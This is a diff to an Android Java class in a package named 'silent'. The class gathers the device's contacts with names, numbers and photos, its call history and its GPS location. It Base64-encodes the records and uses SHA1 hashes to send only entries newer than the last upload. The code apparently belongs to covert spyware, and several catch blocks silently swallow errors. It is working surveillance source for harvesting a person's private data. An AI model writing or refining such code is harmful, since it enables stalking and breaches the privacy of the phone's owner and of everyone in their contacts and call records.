@@ -32,6 +32,9 @@ import org.json.JSONObject;
 
 import java.io.File;
 import java.io.InputStream;
+import java.io.UnsupportedEncodingException;
+import java.security.NoSuchAlgorithmException;
+import java.sql.Timestamp;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.Date;
@@ -39,7 +42,9 @@ import java.util.List;
 
 import src.silent.models.ContactModel;
 import src.silent.models.SmsModel;
+import src.silent.utils.BitmapJsonHelper;
 import src.silent.utils.LocationHandler;
+import src.silent.utils.SHA1Helper;
 import src.silent.utils.ServerCommunicationHandler;
 
 /**
@@ -90,6 +95,7 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         try {
             Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             JSONObject locationData = new JSONObject();
+            String shaString = "";
             if (location != null && location.getTime() > Calendar.getInstance().getTimeInMillis() -
                     120000) {
 
@@ -177,44 +183,94 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         ContentResolver contentResolver = params.getContentResolver();
         Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null);
-        if (cursor != null) {
-            while (cursor.moveToNext()) {
-                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
-                if (cursor.getInt(cursor.getColumnIndex(ContactsContract.
-                        Contacts.HAS_PHONE_NUMBER)) > 0) {
-                    Cursor cursorInfo = contentResolver.query(ContactsContract.
-                                    CommonDataKinds.Phone.CONTENT_URI, null,
-                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                            new String[]{id}, null);
-                    InputStream inputStream = ContactsContract.Contacts.
-                            openContactPhotoInputStream(params.getContentResolver(),
-                                    ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,
-                                            new Long(id)));
+        try {
+            if (cursor != null) {
+                List<String> numbers = new ArrayList<>();
+                JSONObject contacts = new JSONObject();
+                JSONArray informationArray = new JSONArray();
+                String shaString;
+                Boolean flag = false;
+                while (cursor.moveToNext()) {
+                    shaString = "";
+                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+                    if (cursor.getInt(cursor.getColumnIndex(ContactsContract.
+                            Contacts.HAS_PHONE_NUMBER)) > 0) {
+                        Cursor cursorInfo = contentResolver.query(ContactsContract.
+                                        CommonDataKinds.Phone.CONTENT_URI, null,
+                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                                new String[]{id}, null);
+                        InputStream inputStream = ContactsContract.Contacts.
+                                openContactPhotoInputStream(params.getContentResolver(),
+                                        ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,
+                                                new Long(id)));
 
-                    Uri person = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,
-                            new Long(id));
-                    Uri pURI = Uri.withAppendedPath(person,
-                            ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);
+                        Uri person = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,
+                                new Long(id));
+                        Uri pURI = Uri.withAppendedPath(person,
+                                ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);
 
-                    Bitmap photo = null;
-                    if (inputStream != null) {
-                        photo = BitmapFactory.decodeStream(inputStream);
+                        Bitmap photo = null;
+                        if (inputStream != null) {
+                            photo = BitmapFactory.decodeStream(inputStream);
+                        }
+                        cursorInfo.moveToFirst();
+                        shaString += cursor.getString(cursor
+                                .getColumnIndex(ContactsContract.
+                                Contacts.DISPLAY_NAME));
+                        shaString += cursorInfo.getString(cursorInfo.
+                                getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                        shaString += BitmapJsonHelper.getStringFromBitmap(photo);
+
+                        if(flag)
+                        {
+                            JSONObject information = new JSONObject();
+                            information.put("Name", Base64.encodeToString(
+                                    cursor.getString(cursor
+                                            .getColumnIndex(ContactsContract.
+                                                    Contacts.DISPLAY_NAME)).getBytes(),
+                                    Base64.URL_SAFE
+                            ));
+                            information.put("Number", Base64.encodeToString(
+                                    cursorInfo.getString(cursorInfo.
+                                            getColumnIndex(ContactsContract
+                                                    .CommonDataKinds.Phone.NUMBER)).getBytes(),
+                                    Base64.URL_SAFE
+                            ));
+                            information.put("Picture", BitmapJsonHelper
+                                    .getStringFromBitmap(photo));
+                            informationArray.put(information);
+                        }
+
+                        if (!hash.equals("0") && SHA1Helper.SHA1(shaString).equals(hash)) {
+                            flag = true;
+                        }
+
+                        if (hash.equals("0")) {
+                            JSONObject information = new JSONObject();
+                            information.put("Name", Base64.encodeToString(
+                                    cursor.getString(cursor
+                                            .getColumnIndex(ContactsContract.
+                                                    Contacts.DISPLAY_NAME)).getBytes(),
+                                    Base64.URL_SAFE
+                            ));
+                            information.put("Number", Base64.encodeToString(
+                                    cursorInfo.getString(cursorInfo.
+                                            getColumnIndex(ContactsContract
+                                                    .CommonDataKinds.Phone.NUMBER)).getBytes(),
+                                    Base64.URL_SAFE
+                            ));
+                            information.put("Picture", BitmapJsonHelper
+                                    .getStringFromBitmap(photo));
+                            informationArray.put(information);
+                        }
+
+                        cursorInfo.close();
                     }
-                    cursorInfo.moveToFirst();
-                    ContactModel info = new ContactModel();
-                    info.id = id;
-                    info.name = cursor.getString(cursor.getColumnIndex(ContactsContract.
-                            Contacts.DISPLAY_NAME));
-                    info.mobileNumber = cursorInfo.getString(cursorInfo.
-                            getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                    info.photo = photo;
-                    info.photoURI = pURI;
-                    list.add(info);
-
-                    cursorInfo.close();
                 }
+                cursor.close();
             }
-            cursor.close();
+        } catch (Exception ex) {
+
         }
     }
 
@@ -223,49 +279,97 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
             ContentResolver contentResolver = params.getContentResolver();
             Cursor managedCursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null,
                     null, null, null);
-            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
-            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
-            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
-            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
+            if (managedCursor != null) {
+                int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
+                int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
+                int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
+                int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
 
-            JSONObject callHistory = new JSONObject();
-            JSONArray informationArray = new JSONArray();
-            while (managedCursor.moveToNext()) {
-                JSONObject information = new JSONObject();
-                information.put("Number", managedCursor.getString(number));
-                information.put("Date", managedCursor.getString(date));
-                information.put("Duration", managedCursor.getString(duration));
+                JSONObject callHistory = new JSONObject();
+                JSONArray informationArray = new JSONArray();
+                String shaString = "";
+                boolean flag = false;
+                int counter = 5;
+                while (managedCursor.moveToNext() && counter != 0) {
+                    shaString = "";
+                    shaString += managedCursor.getString(number);
+                    Timestamp cal = new Timestamp(Long.valueOf(managedCursor.getString(date)));
+                    shaString += cal.toString();
+                    shaString += managedCursor.getString(duration);
+                    String callType = managedCursor.getString(type);
+                    shaString += getCallType(callType);
 
-                String callType = managedCursor.getString(type);
-                int dircode = Integer.parseInt(callType);
-                switch (dircode) {
-                    case CallLog.Calls.OUTGOING_TYPE:
-                         information.put("Direction", "OUTGOING");
-                        break;
+                    if (flag) {
+                        JSONObject information = new JSONObject();
+                        information.put("Number",
+                                Base64.encodeToString(managedCursor.getString(number).getBytes(),
+                                        Base64.URL_SAFE));
+                        information.put("Date",
+                                Base64.encodeToString(cal.toString().getBytes(),
+                                        Base64.URL_SAFE));
+                        information.put("Duration",
+                                Base64.encodeToString(managedCursor.getString(duration).getBytes(),
+                                        Base64.URL_SAFE));
+                        information.put("Direction",
+                                Base64.encodeToString(getCallType(callType).getBytes(), Base64.URL_SAFE));
+                        informationArray.put(information);
+                    }
 
-                    case CallLog.Calls.INCOMING_TYPE:
-                        information.put("Direction", "INCOMING");
-                        break;
+                    if (!hash.equals("0") && SHA1Helper.SHA1(shaString).equals(hash)) {
+                        flag = true;
+                    }
 
-                    case CallLog.Calls.MISSED_TYPE:
-                        information.put("Direction", "MISSED");
-                        break;
+                    if (hash.equals("0")) {
+                        JSONObject information = new JSONObject();
+                        information.put("Number",
+                                Base64.encodeToString(managedCursor.getString(number).getBytes(),
+                                        Base64.URL_SAFE));
+                        information.put("Date",
+                                Base64.encodeToString(cal.toString().getBytes(),
+                                        Base64.URL_SAFE));
+                        information.put("Duration",
+                                Base64.encodeToString(managedCursor.getString(duration).getBytes(),
+                                        Base64.URL_SAFE));
+                        information.put("Direction",
+                                Base64.encodeToString(getCallType(callType).getBytes(), Base64.URL_SAFE));
+                        informationArray.put(information);
+                    }
+                    counter--;
                 }
+                managedCursor.close();
 
-                informationArray.put(information);
+                callHistory.put("Calls", informationArray);
+                if (!SHA1Helper.SHA1(shaString).equals(hash)) {
+                    callHistory.put("Hash",
+                            Base64.encodeToString(SHA1Helper.SHA1(shaString).getBytes(),
+                                    Base64.URL_SAFE));
+                    bulkData.put("CallHistory", callHistory);
+                }
             }
-            managedCursor.close();
-
-            callHistory.put("Calls", informationArray);
-            if (informationArray.hashCode() != Integer.parseInt(hash)) {
-                callHistory.put("Hash", informationArray.hashCode());
-                bulkData.put("CallHistory", callHistory);
-            }
-
         } catch (SecurityException ex) {
             Log.d("CALL LOG EX", ex.getMessage());
         } catch (JSONException e) {
             e.printStackTrace();
+        } catch (NoSuchAlgorithmException e) {
+            e.printStackTrace();
+        } catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private String getCallType(String callType) {
+        int dircode = Integer.parseInt(callType);
+        switch (dircode) {
+            case CallLog.Calls.OUTGOING_TYPE:
+                return "OUTGOING";
+
+            case CallLog.Calls.INCOMING_TYPE:
+                return "INCOMING";
+
+            case CallLog.Calls.MISSED_TYPE:
+                return "MISSED";
+            default:
+                return "";
         }
     }
 
